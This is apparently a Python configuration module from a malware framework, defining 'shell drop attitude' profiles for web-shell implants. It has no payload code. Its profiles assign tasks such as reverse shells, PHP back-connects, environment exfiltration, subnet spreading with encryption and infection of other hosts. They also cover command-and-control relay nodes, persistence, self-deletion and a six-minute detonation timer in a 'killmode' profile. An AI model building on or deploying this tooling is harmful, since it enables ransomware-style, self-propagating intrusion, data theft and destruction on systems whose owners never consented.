# MINC - Shell Drop Attitudes Configuration (v4 – Memory Encryption Support Added)

ATTITUDE_PROFILES = {

    "passive": {
        "description": "Drop and leave. No post-tasking. Logs access & comms only.",
        "tags": ["passive"],
        "auto_tasks": [],
        "persistence": False,
        "recon": False,
        "beacon": True,
        "c2_node": False,
        "memory_flag": False,
        "aggressive_handoff": False,
        "self_delete": False,
        "encrypted_modules": []
    },

    "monitor": {
        "description": "Drop and observe. Adds basic recon modules and routing info collection.",
        "tags": ["monitor"],
        "auto_tasks": ["scan_local", "exfil_env"],
        "persistence": True,
        "recon": True,
        "beacon": True,
        "c2_node": False,
        "memory_flag": True,
        "aggressive_handoff": False,
        "self_delete": False,
        "encrypted_modules": ["exfil_env.php"]
    },

    "aggressive": {
        "description": "Drop, infect, and expand. Triggers botnet logic, persistence chain, and C2 setup.",
        "tags": ["aggressive", "relay", "burnable"],
        "auto_tasks": ["reverse_shell", "php_backconnect", "spread_and_encrypt"],
        "persistence": True,
        "recon": True,
        "beacon": True,
        "c2_node": True,
        "memory_flag": True,
        "aggressive_handoff": True,
        "self_delete": False,
        "encrypted_modules": ["reverse_shell.py", "spread_and_encrypt.py"]
    },

    "stealth_relay": {
        "description": "Relay node with beacon-only C2 communication and memory-only modules.",
        "tags": ["relay", "stealth"],
        "auto_tasks": ["reverse_shell"],
        "persistence": False,
        "recon": False,
        "beacon": True,
        "c2_node": True,
        "memory_flag": True,
        "aggressive_handoff": False,
        "self_delete": False,
        "encrypted_modules": ["reverse_shell.py"]
    },

    "burn_after_exec": {
        "description": "Execute once, upload task payload, then detonate implant (self-delete).",
        "tags": ["burnable", "one-time"],
        "auto_tasks": ["spread_and_encrypt"],
        "persistence": False,
        "recon": False,
        "beacon": False,
        "c2_node": False,
        "memory_flag": True,
        "aggressive_handoff": False,
        "self_delete": True,
        "encrypted_modules": ["spread_and_encrypt.py"]
    },

    "killmode": {
        "description": "Spread, infect subnet, then detonate all implants after 6 minutes.",
        "tags": ["killmode", "burnable", "subnet_volatile"],
        "auto_tasks": ["reverse_shell", "php_backconnect", "spread_and_encrypt", "infect_others"],
        "persistence": False,
        "recon": True,
        "beacon": True,
        "c2_node": True,
        "memory_flag": True,
        "aggressive_handoff": False,
        "self_delete": True,
        "detonation_timer": 360,
        "encrypted_modules": ["spread_and_encrypt.py", "reverse_shell.py", "memory_ejector.py"]
    }
}


def get_attitude(attitude_name):
    """Safely retrieve a configured drop attitude profile."""
    return ATTITUDE_PROFILES.get(attitude_name.lower(), ATTITUDE_PROFILES["passive"])

